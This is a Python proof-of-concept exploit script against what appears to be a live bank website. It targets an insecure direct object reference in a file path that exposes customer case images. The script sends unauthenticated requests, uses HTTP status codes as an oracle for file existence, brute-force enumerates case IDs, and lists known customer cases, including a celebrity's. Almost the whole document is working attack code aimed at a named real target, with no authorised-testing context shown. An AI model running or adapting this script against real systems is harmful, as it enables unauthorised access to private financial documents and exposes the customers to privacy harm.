#!/usr/bin/env python3
"""
PoC: OKBANK.COM IDOR - Insecure Direct Object Reference via File Existence Oracle
Target: https://www.okbank.com
Vulnerability: /web/userupdate/{YEAR}/{CASE_ID}/{YYYYMMDD{SEQ}.png}

No authentication required. Directory listing is blocked (403) but individual
files are directly accessible. File existence can be determined via HTTP 200/302.
"""
import requests
import sys

BASE_URL = "https://www.okbank.com/web/userupdate"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Confirmed accessible case IDs discovered from public webpages
KNOWN_CASES = {
    "TW000635": {"years": [2024, 2025, 2026], "desc": "Loan case referenced on homepage, service pages"},
    "TW000644": {"years": [2025], "desc": "Car loan case"},
    "TW000903": {"years": [2026], "desc": "Debt consolidation case"},
    "AB070078": {"years": [2019, 2020, 2021, 2024, 2025], "desc": "Celebrity case, years of files"},
}

def check_file_exists(year, case_id, filename):
    """Returns True if file exists (HTTP 200), False otherwise (HTTP 302/403/404)"""
    url = f"{BASE_URL}/{year}/{case_id}/{filename}"
    resp = requests.head(url, headers=HEADERS, allow_redirects=False, timeout=10)
    return resp.status_code == 200, resp.status_code

def enumerate_case(case_id, year, dates, max_seq=20):
    """Enumerate file existence for a given case using date+sequence pattern"""
    found = []
    for date_base in dates:
        for seq in range(1, max_seq + 1):
            filename = f"{date_base}{seq}.png"
            exists, status = check_file_exists(year, case_id, filename)
            if exists:
                found.append(f"{filename}")
                print(f"  [200] {filename}")
    return found

def main():
    print("=" * 70)
    print("OKBANK.COM IDOR - File Existence Oracle PoC")
    print("=" * 70)
    
    # Demonstrate existence oracle
    print("\n[1] Existence Oracle Demonstration (TW000635, 2026):")
    exists, status = check_file_exists(2026, "TW000635", "202602061.png")
    print(f"  Existing file  -> HTTP {status} (exists={exists})")
    exists, status = check_file_exists(2026, "TW000635", "202602062.png")
    print(f"  Non-existing    -> HTTP {status} (exists={exists})")
    
    # Demonstrate directory listing is blocked
    print("\n[2] Directory Listing Blocked:")
    resp = requests.get(f"{BASE_URL}/", headers=HEADERS, timeout=10)
    print(f"  GET /web/userupdate/ -> HTTP {resp.status_code}")
    
    # Demonstrate no authentication required
    print("\n[3] No Authentication Required:")
    resp = requests.get(f"{BASE_URL}/2026/TW000635/202602061.png", headers=HEADERS, timeout=10)
    print(f"  Direct access with no cookies/headers -> HTTP {resp.status_code}, {len(resp.content)} bytes")
    
    # Demonstrate case enumeration
    print("\n[4] Case Enumeration (random date probing, existence oracle):")
    test_cases = [f"TW000{c}" for c in range(100, 200)] + [f"TW000{c}" for c in range(500, 600)] + [f"TW000{c}" for c in range(900, 1000)]
    found_cases = []
    for case in test_cases:
        exists, _ = check_file_exists(2026, case, "202601011.png")
        if exists:
            found_cases.append(case)
            print(f"  [200 FOUND] {case}")
    
    if not found_cases:
        print("  (No additional cases found via random date probing)")
        print("  (Files only discoverable via public webpage links)")
    
    print("\n[5] Known accessible cases:")
    for case_id, info in KNOWN_CASES.items():
        print(f"  {case_id}: years={info['years']}, {info['desc']}")
    
    print("\n" + "=" * 70)
    print("VULNERABILITY: IDOR / Broken Access Control")
    print("IMPACT: Attacker can enumerate and access all user case file images")
    print("        without authentication, using existence oracle (200/302)")
    print("=" * 70)

if __name__ == "__main__":
    main()
